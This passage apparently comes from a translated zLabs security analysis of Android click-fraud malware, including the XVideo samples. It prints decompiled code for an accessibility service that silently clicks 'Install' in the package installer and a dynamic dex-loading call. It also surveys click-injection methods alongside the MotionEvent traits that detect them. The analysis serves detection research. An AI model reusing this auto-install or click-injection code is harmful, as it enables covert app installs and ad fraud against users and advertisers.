                       "application/vnd.android.package-archive");
       startActivity(promptInstall);
    }
找到并点击“Install button”（安装按钮）。
    public class HelpService extends AccessibilityService {
        private static final CharSequence PACKAGE         = "com.android.packageinstaller;      
        @TargetApi(Build.VERSION_CODES.JELLY_BEAN) @Override public void onAccessibilityEvent(final AccessibilityEvent event) {
            if(null == event || null == event.getSource()) { return; }
            if(event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
                    event.getPackageName().equals("com.android.packageinstaller")){
                if(className.endsWith("PackageInstallerActivity")){
                    simulationClick(event, "Install");             
                }         
            }
        }
        @TargetApi(Build.VERSION_CODES.JELLY_BEAN) private void simulationClick(AccessibilityEvent event, String text){
            Log.v("click", "simulationClick: "+ text);
            List nodeInfoList = event.getSource().findAccessibilityNodeInfosByText(text);
            for (AccessibilityNodeInfo node : nodeInfoList) {
                if (node.isClickable() && node.isEnabled()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
            }
        }
        @Override public void onInterrupt() { }
    }
**XVideo恶意软件分析**
接下来我们来分析一下“XVideo”恶意软件，这款恶意软件所作的操作与上述操作类似，唯一的不同是它并没有隐藏安装过程。
这款恶意软件同样实现了一些典型的恶意软件功能，以规避Google Play上的恶意软件检测机制，比如：
1、虽然应用的包名各不相同，但所有activity的名字都采用“pronclub.*”格式。
**2、应用程序在assets目录中存放APK文件。** APK头部数据使用滚动式异或算法（rolling XOR）进行编码，通过
**DexClassLoader** 动态加载dex代码。
    DexClassLoader dLoader = new DexClassLoader(str, str2, str4, (ClassLoader) fjksbxcvbcxnnxswdpkff.getFieldfjksbxcvbcxnnxklOjbect(fjksbxcvbcxnnxalldd[3], wrfjksbxcvbcxnnx.get(), fjksbxcvbcxnnxalldd[4]));
3、这款CBA注册了一个无障碍服务，服务名为“Play decoder++”。在代码中，该字符串的属性名为“auto install
service”，与其真实功能非常贴切。
    [Decoder] Play Decoder++
**五、其他点击欺诈方法**
****
点击欺诈是一种非常狡猾的犯罪行为，它会使用各种方法来绕过检测技术。在判断某个应用是否脱离用户交互过程，实施点击欺诈行为时，我们应注意其中一些方法或者参数，根据这些因素来具体判断：
1、应用所点击的区域是否超出应用UI组件范围？（比如Facebook应用点击了WhatsApp应用）
2、应用请求哪些权限？
3、应用是否请求Root权限，或者是否以系统应用身份运行？（位于 **/system/app** 目录下的应用通常带有操作系统的签名）
4、应用行为是否在设备上可见？前文提到过，服务端负责基于信息收集的观察方法，与应用所使用的点击方法无关。
当用户点击某个Android UI组件（ **ViewGroup**
）时，操作系统或广告SDK所得到的输出结果如下所示。比如，一次用户点击事件会生成两个MotionsEvent ，分别对应手指按下以及手指抬起动作：
    MotionEvent { action=ACTION_DOWN, id[0]=0, x[0]=198.75, y[0]=63.42859, toolType[0]=TOOL_TYPE_FINGER, buttonState=0, metaState=0, flags=0x0, edgeFlags=0x0, pointerCount=1, historySize=0, eventTime=18381654, downTime=18381654, deviceId=6, source=0x1002 }
    MotionEvent { action=ACTION_UP, id[0]=0, x[0]=198.75, y[0]=63.42859, toolType[0]=TOOL_TYPE_FINGER, buttonState=0, metaState=0, flags=0x0, edgeFlags=0x0, pointerCount=1, historySize=0, eventTime=18381742, downTime=18381654, deviceId=6, source=0x1002 }
这里我们定义一个术语：设备端检测（on-device-detection）技术，即能否通过上述MotionEvent 参数发现欺诈点击行为。
**5.1 使用Android平台的dispatchTouchEvent API**
如前文所述，这个API的特点为：
1、只能点击应用自己的UI组件。
2、无需请求任何权限就能运行。
3、无需root权限或以系统应用运行就能提交操作。
前面我们给出了 **com.life.read.physical.trian**
反编译后的源代码，如果使用这份代码来操作点击行为，那么只需要注意几个参数就能发现欺诈行为。
首先是source=0x1002，其次是TOOL_TYPE_UNKNOWN。
应用可以保存引用信息，回收一些Android
UI组件（如MotionEvent.PointerCoords、MotionEvent.PointerProperties等），设置其他“source”属性值，在私有API上使用反射（reflection）机制，通过这些操作，应用在设备上的所作所为对用户而言会变得完全透明。
这些技巧如果应用得当，就能真正达到不劳而获的效果。
**5.2 滥用无障碍服务**
如前文所述，这个服务具备如下特点：
1、可以点击其他组件。
2、需要请求BIND_ACCESSIBILITY_SERVICE权限。启动无障碍服务需要由用户在设备设置中启用该服务选项。
3、无需[root权限](https://en.wikipedia.org/wiki/Rooting_\(Android\))或以系统级应用运行。
这类欺诈行为对应“toolType[0]=TOOL_TYPE_UNKNOWN”，因此很容易识别。
虽然我们可以通过设备上的点击欺诈特征发现广告欺诈软件，然而无法发现安装欺诈或者流量欺诈型软件，但我们还是可以使用基于服务端信息的其他识别方法加以检测。
**5.3 使用Android底层输入管道**
[Android输入子系统](https://source.android.com/devices/input/touch-devices)（Android
input subsystem）中包含一个贯穿多层子系统的事件管道（event pipeline）。shell用户可以使用“input”程序来创建触摸事件。
这种方法特点如下：
1、可以点击其他组件。
2、无需任何权限就能运行。
3、需要Shell用户权限，也就是说Root权限足以满足需求。
使用这种方法时，在设备上的点击事件会带有“toolType[0]=TOOL_TYPE_UNKNOWN”参数，可借此来识别欺诈行为。
**5.4 在“InputManager”类的injectInputEvent方法上使用反射技术**
欺诈应用可以在[InputManager](https://developer.android.com/reference/android/hardware/input/InputManager.html)上使用[Java的反射（Reflection）API](https://docs.oracle.com/javase/tutorial/reflect/)，这种方法的特点如下：
1、可以点击应用组件。以shell用户运行时可以点击其他组件。
2、无需任何权限就能运行。
3、可能需要以系统应用身份运行，具体取决于所使用的操作系统以及设备。
使用这种方法时，在设备上的点击事件会带有“toolType[0]=TOOL_TYPE_UNKNOWN”参数，可借此来识别欺诈行为。
攻击者还可以使用其他一些方法来实施广告欺诈、安装欺诈以及数据流量欺诈行为，比如：
1、篡改广告SDK。
2、逆向广告SDK，使用反射技术发送伪造的事件。
3、Hook广告ADK或者系统UI。
**六、总结**
****
随着时间的推移，CBA也变得越来越复杂。为了能够随意玩弄操作系统，使用最新开发工具包的应用开发者可以采取各种各样的创新手法。综合利用各种方法后，CBA可能会完全规避现有的检测技术，除非我们能找到更加有效的实时检测方法，才能从设备中移除这类恶意应用。
未来，广告业的龙头服务商需要采取相应的防御手段或保护方法，来对抗僵尸软件以及点击欺诈软件，避免向欺诈行为支付金钱。应用开发者需要提供诸如[zIAP™](https://www.zimperium.com/ziap-in-app-protection)的全面保护方案，来实时监测欺诈软件及移动恶意软件。如果缺少此类保护机制，那么每次点击时，未受保护的开发者以及设备所能得到的收益就会受到影响。
本文列举了点击欺诈行为的几个案例并做了相关分析，希望读者阅读本文后能有所收获。zLabs对这类行为的研究领域涵盖应用、移动操作系统以及硬件领域，目标是研发最好的移动安全产品及服务，保护个人及企业信息。
如果你有具体问题或者想向zLabs或其他团队反馈意见及建议，欢迎通过这个页面来联系我们。
感谢zLabs的所有研究人员，特别是Matteo Favaro
（[@fvrmatteo](https://twitter.com/fvrmatteo)），以上研究成果离不开他们的帮助。